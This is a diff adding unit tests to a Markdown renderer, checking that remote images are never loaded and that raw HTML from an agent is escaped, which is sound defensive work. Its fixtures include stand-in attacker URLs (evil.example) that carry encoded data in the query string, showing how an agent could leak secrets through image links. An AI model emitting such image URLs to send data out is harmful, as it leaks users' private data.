@@ -15,6 +15,23 @@ describe('renderMarkdown', () => {
     expect(renderMarkdown('```ts\nconst a = 1;\n```')).toContain('<pre><code class="hljs language-ts"><span class="hljs-keyword">const</span> a = <span class="hljs-number">1</span>;');
   });
 
+  it('never loads a remote image: an agent could leak data through its URL', () => {
+    for (const src of ['https://evil.example/p?d=c2VjcmV0', 'http://x/y.png', '//evil.example/a.png']) {
+      const html = renderMarkdown(`Xem ![sơ đồ](${src}) nhé`);
+      expect(html).not.toContain('<img');
+      expect(html).toContain('sơ đồ');
+    }
+    expect(renderMarkdown('![a][r]\n\n[r]: https://evil.example/x')).not.toContain('<img');
+  });
+
+  it('shows raw HTML from the agent as text', () => {
+    for (const raw of ['<img src="https://evil.example/x">', '<div><img src=https://e/x></div>', 'chữ <img src="https://e/x"> chữ', '<picture><source srcset="https://e/x"></picture>']) {
+      const html = renderMarkdown(raw);
+      expect(html).not.toMatch(/<(img|source|picture|div)\b/);
+      expect(html).toContain('&lt;');
+    }
+  });
+
   it('copies as plain text without Markdown marks', () => {
     expect(plainText('Dùng **Angular 21**:\n\n- một\n- `hai`')).toBe('Dùng Angular 21:\n• một\n• hai');
   });
